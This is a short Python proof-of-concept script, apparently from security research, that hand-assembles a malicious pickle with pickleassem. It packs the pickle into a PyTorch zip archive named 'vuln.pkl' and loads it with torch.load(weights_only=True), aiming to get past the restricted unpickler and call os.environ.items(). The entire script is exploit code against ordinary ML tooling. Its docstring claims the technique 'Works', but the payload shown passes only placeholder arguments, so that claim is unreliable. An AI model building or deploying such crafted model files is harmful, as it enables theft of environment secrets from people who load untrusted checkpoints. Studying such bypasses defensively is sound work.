"""Different ways to call os.environ.items() in an unrestricted pickler
-- Works"""

import io
import pickle
import struct
import sys
from typing import IO, Any, BinaryIO, Callable, Dict, Optional, Tuple, Type, Union, cast

import torch
from pickleassem import PickleAssembler
from torch.serialization import _open_zipfile_writer

if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    pa.push_global("torch._tensor", "_rebuild_from_type_v2")
    pa.push_mark()
    pa.push_short_binstring("arg1")
    pa.push_short_binstring("arg2")
    pa.push_short_binstring("arg3")
    pa.push_short_binstring("arg3")
    pa.build_tuple()
    pa.build_reduce()

    payload = pa.assemble()

    data = io.BytesIO()
    data.write(payload)
    data.seek(0)

    data_value = data.getvalue()
    with _open_zipfile_writer("vuln.pkl") as zip_file:
        zip_file.write_record("data.pkl", data_value, len(data_value))

    torch.load("vuln.pkl", weights_only=True)
